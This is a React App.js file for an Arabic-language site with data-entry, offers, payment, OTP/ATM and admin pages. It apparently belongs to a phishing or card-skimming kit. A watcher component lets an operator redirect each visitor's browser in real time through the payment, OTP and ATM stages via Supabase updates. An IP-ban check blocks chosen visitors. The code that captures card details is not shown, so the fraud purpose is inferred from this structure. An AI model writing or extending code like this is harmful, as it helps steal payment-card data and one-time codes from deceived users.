import { useState, useEffect } from "react";
import { BrowserRouter as Router, Routes, Route, useNavigate } from "react-router-dom";
import { supabase } from "./supabase";
import "./styles.css";

import { Home } from "./pages/Home/Home";
import { DataForm } from "./pages/DataForm/DataForm";
import { Offers } from "./pages/Offers/Offers";
import { PaymentMethod } from "./pages/PaymentMethod/PaymentMethod";
import { Payment } from "./pages/Payment/Payment";
import { Admin } from "./pages/Admin/Admin";
import { Success } from "./pages/Success/Success";
import Privacy from "./pages/Privacy/Privacy";
import { useLocation } from "react-router-dom";

function ScrollToTop() {
  const { pathname } = useLocation();
  useEffect(() => {
    window.scrollTo(0, 0);
  }, [pathname]);
  return null;
}

function CustomerRedirectWatcher() {
  const navigate = useNavigate();

  const pageToRoute = (page) => {
    if (!page) return null;
    const pageMap = {
      '1- الصفحه الرئيسيه': '/',
      '2- صفحه البيانات': '/dataform',
      '3- صفحه العروض': '/offers',
      '4- طريقه الدفع': '/payment-method',
      '5- صفحه الدفع': '/payment',
      'صفحة النجاح (مكتمل)': '/success',
    };
    if (pageMap[page]) return pageMap[page];
    if (page.includes('الرئيسيه')) return '/';
    if (page.includes('البيانات')) return '/dataform';
    if (page.includes('العروض')) return '/offers';
    if (page.includes('طريقه')) return '/payment-method';
    if (page.includes('الدفع') || page.includes('ينتظر')) return '/payment';
    if (page.includes('otp') || page.includes('atm') || page.includes('يملا')) return '/payment';
    if (page.includes('نجاح') || page.includes('مكتمل')) return '/success';
    return null;
  };

  useEffect(() => {
    const customerId = sessionStorage.getItem('customerId');
    if (!customerId) return;

    const channel = supabase
      .channel(`customer_redirect_${customerId}`)
      .on(
        'postgres_changes',
        { event: 'UPDATE', schema: 'public', table: 'customers' },
        (payload) => {
          if (payload.new.id !== customerId) return;
          const newPage = payload.new.page;
          const oldPage = payload.old?.page;
          if (newPage && newPage !== oldPage) {
            const route = pageToRoute(newPage);
            if (route) navigate(route);
          }
        }
      )
      .subscribe();

    return () => {
      supabase.removeChannel(channel);
    };
  }, [navigate]);

  return null;
}

export default function App() {
  const [isBanned, setIsBanned] = useState(false);

  useEffect(() => {
    const checkBan = async () => {
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        const userIp = data.ip;

        // Initial check
        const { data: banData } = await supabase
          .from('banned_ips')
          .select('*')
          .eq('ip', userIp);
        
        if (banData && banData.length > 0) {
          setIsBanned(true);
        }

        // Listen for new bans
        const channel = supabase
          .channel('public:banned_ips')
          .on(
            'postgres_changes',
            { event: 'INSERT', filter: `ip=eq.${userIp}`, schema: 'public', table: 'banned_ips' },
            () => setIsBanned(true)
          )
          .subscribe();

        return () => supabase.removeChannel(channel);
      } catch (err) {
        console.error("Ban check error:", err);
      }
    };
    checkBan();
  }, []);

  if (isBanned) {
    return (
      <div style={{ height: '100vh', display: 'flex', alignItems: 'center', justifyContent: 'center', textAlign: 'center', padding: '20px', backgroundColor: '#f8fafc', fontFamily: 'Tajawal, sans-serif' }}>
        <div>
          <h1 style={{ color: '#ef4444', fontSize: '48px', marginBottom: '20px' }}>⚠️</h1>
          <h2 style={{ color: '#1e293b', marginBottom: '10px' }}>عذراً، لا يمكنك الوصول إلى هذا الموقع</h2>
          <p style={{ color: '#64748b' }}>لقد تم تقييد وصولك بسبب مخالفة سياسات الاستخدام. إذا كنت تعتقد أن هذا خطأ، يرجى التواصل مع الدعم الفني.</p>
        </div>
      </div>
    );
  }

  return (
    <Router>
      <ScrollToTop />
      <CustomerRedirectWatcher />
      <Routes>
        <Route path="/" element={<Home />} />
        <Route path="/dataform" element={<DataForm />} />
        <Route path="/offers" element={<Offers />} />
        <Route path="/payment-method" element={<PaymentMethod />} />
        <Route path="/payment" element={<Payment />} />
        <Route path="/admin" element={<Admin />} />
        <Route path="/success" element={<Success />} />
        <Route path="/privacy" element={<Privacy />} />
      </Routes>
    </Router>
  );
}
